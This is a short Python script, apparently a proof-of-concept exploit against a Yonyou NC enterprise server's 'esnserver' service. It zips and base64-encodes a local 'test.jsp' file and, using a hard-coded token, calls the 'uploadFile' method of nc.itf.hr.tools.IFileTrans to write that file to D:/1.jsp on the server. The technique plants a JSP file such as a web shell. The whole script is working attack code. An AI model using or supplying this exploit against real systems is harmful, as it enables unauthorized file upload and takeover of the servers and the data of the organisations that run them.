import io
import zipfile
import base64
import requests


def create_data(file_path: str) -> bytes:
    # 读取文件内容
    with open(file_path, "rb") as f:
        file_bytes = f.read()

    # 创建内存字节流
    baos = io.BytesIO()

    # 写入 zip 文件
    with zipfile.ZipFile(baos, 'w', zipfile.ZIP_DEFLATED) as zos:
        # 注意，这里 entry 名称固定为 "compressed"
        zos.writestr("compressed", file_bytes)

    # 返回字节数组
    return baos.getvalue()


if __name__ == "__main__":
    url = "http://127.0.0.1:8051/service/esnserver"

    heads = {"Token": "469ce01522f64366750d1995ca119841"}

    data = create_data("test.jsp")
    encode_data = base64.b64encode(data).decode("utf8")

    jsonstr = {"invocationInfo": {"ucode": "123"}, "method": "uploadFile",
               "className": "nc.itf.hr.tools.IFileTrans",
               "param": {"p1": encode_data, "p2": "D:/1.jsp"},
               "paramType": ["p1:[B", "p2:java.lang.String"]}

    resp = requests.post(url=url, json=jsonstr, headers=heads)
    print(resp.text)